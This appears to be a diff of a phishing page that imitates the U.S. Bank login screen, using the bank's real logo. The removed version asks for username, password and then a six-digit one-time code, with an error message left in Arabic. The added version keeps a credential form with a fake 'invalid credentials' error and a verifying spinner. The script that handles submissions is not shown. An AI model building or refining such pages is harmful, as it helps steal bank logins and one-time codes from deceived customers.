@@ -3,87 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Log in | U.S. Bank</title>
+    <title>U.S. Bank | Login</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
-    <div id="loader">
-        <div class="spinner"></div>
-        <p style="margin-top: 20px; font-weight: bold; color: #0c1c3e;">Verifying your information...</p>
+<div id="loader">
+    <div class="spinner"></div>
+    <p style="margin-top: 20px; font-weight: bold; color: #0c1c3e;">Verifying...</p>
+</div>
+
+<header class="header">
+    <img src="https://www.usbank.com/etc.clientlibs/ecm-global/clientlibs/clientlib-resources/resources/images/svg/logo-personal.svg" alt="Logo">
+</header>
+
+<div class="container">
+    <h1>Log in</h1>
+    <div id="error-box">Invalid credentials, please try again.</div>
+    
+    <form id="loginForm">
+        <div class="form-group">
+            <label>Account type</label>
+            <select id="accType">
+                <option>Online Banking</option>
+                <option>Business Banking</option>
+            </select>
+        </div>
+        <div class="form-group">
+            <input type="text" id="user" placeholder="Username" required>
+        </div>
+        <div class="form-group">
+            <input type="password" id="pass" placeholder="Password" required>
+        </div>
+        <button type="submit" class="action-btn">Log in</button>
+    </form>
+</div>
+
+<footer class="footer">
+    <div class="footer-links">
+        <a href="#">Security</a> | <a href="#">Privacy</a> | <a href="#">Legal</a>
     </div>
-
-    <header class="header">
-        <img src="https://www.usbank.com/etc.clientlibs/ecm-global/clientlibs/clientlib-resources/resources/images/svg/logo-personal.svg" alt="U.S. Bank Logo">
-    </header>
-
-    <div class="login-box" id="login-step">
-        <h1>Log in</h1>
-        
-        <div id="error-msg">
-            Invalid username or password. Please try again.
-        </div>
-
-        <form id="loginForm" onsubmit="handleLoginSubmit(event)">
-            <div class="form-group">
-                <label for="accType">Account type</label>
-                <select id="accType">
-                    <option value="Online Banking">Online Banking</option>
-                    <option value="Business Banking">Business Banking</option>
-                    <option value="Investments">Investments</option>
-                </select>
-            </div>
-
-            <div class="form-group">
-                <label for="username">Username</label>
-                <input type="text" id="username" name="username" required>
-            </div>
-
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" name="password" required>
-            </div>
-
-            <button type="submit" class="login-btn">Log in</button>
-        </form>
+    <p>© 2026 U.S. Bank. Member FDIC.</p>
+    <div class="disclaimer">
+        Investment and Insurance products and services: Not a Deposit • Not FDIC Insured • May Lose Value • Not Bank Guaranteed • Not Insured by any Federal Government Agency.
     </div>
+</footer>
 
-    <div class="login-box" id="otp-step" style="display: none;">
-        <h1>Enter Code</h1>
-        
-        <div id="otp-error">
-            الرجاء اعادة ادخال الـ OTP بشكل صحيح
-        </div>
-
-        <p style="font-size: 15px; color: #444; margin-bottom: 25px;">
-            We've sent a 6-digit verification code to your registered mobile number.
-        </p>
-
-        <form id="otpForm" onsubmit="handleOTPSubmit(event)">
-            <div class="form-group">
-                <label for="otp_code">Verification Code</label>
-                <input type="text" id="otp_code" name="otp_code" maxlength="6" placeholder="000000" required>
-            </div>
-
-            <button type="submit" class="login-btn">Verify and Login</button>
-        </form>
-    </div>
-
-    <footer class="footer">
-        <div class="footer-links">
-            <a href="#">Security</a> | 
-            <a href="#">Privacy</a> | 
-            <a href="#">Legal</a> | 
-            <a href="#">Contact Us</a>
-        </div>
-        <p>© 2026 U.S. Bank. Member FDIC.</p>
-        
-        <div class="disclaimer">
-            Investment and Insurance products and services: Not a Deposit • Not FDIC Insured • May Lose Value • Not Bank Guaranteed • Not Insured by any Federal Government Agency. <br><br>
-            U.S. Bank is not responsible for and does not guarantee the products, services or performance of U.S. Bancorp Investments.
-        </div>
-    </footer>
-
-    <script src="script.js"></script>
+<script src="script.js"></script>
 </body>
 </html>
